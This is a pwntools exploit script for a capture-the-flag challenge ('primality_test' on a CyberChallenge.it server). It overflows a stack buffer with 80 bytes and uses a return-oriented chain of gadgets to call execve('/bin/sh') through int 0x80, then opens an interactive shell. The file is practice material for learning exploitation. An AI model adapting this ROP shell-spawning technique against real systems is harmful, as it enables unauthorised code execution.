"""
+----------+----------------------------+---------------+--------+--------------------+--------+-----------------------+--------+
|  'A'*80  |  POP_EBX_POP_ECX_RET_ADDR  |  BIN_SH_ADDR  |  0x00  |  POP_EDX_RET_ADDR  |  0x00  |  POP_EAX_INT_80_ADDR  |  0x0b  |
+----------+----------------------------+---------------+--------+--------------------+--------+-----------------------+--------+
"""

from pwn import *

BIN: str = "./primality_test"
HOST: str = "rop.challs.cyberchallenge.it"
PORT: int = 9130

POP_EBX_POP_ECX_RET_ADDR: int = 0x08048609
POP_EDX_RET_ADDR: int = 0x0804860c
POP_EAX_INT_80_ADDR: int = 0x08048606
BIN_SH_ADDR: int = 0x08048991
RET_ADDR_OFFSET: int = 80
PAYLOAD = (
  b'A' * RET_ADDR_OFFSET +
  p32(POP_EBX_POP_ECX_RET_ADDR) + p32(BIN_SH_ADDR) + p32(0x00) +
  p32(POP_EDX_RET_ADDR) + p32(0x00) +
  p32(POP_EAX_INT_80_ADDR) + p32(0x0b)
)

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)

def main():
  app = get_target()
  app.sendlineafter(b"Enter a number: ", PAYLOAD)
  app.interactive()
  app.clean()
  app.close()

if __name__ == "__main__":
  main()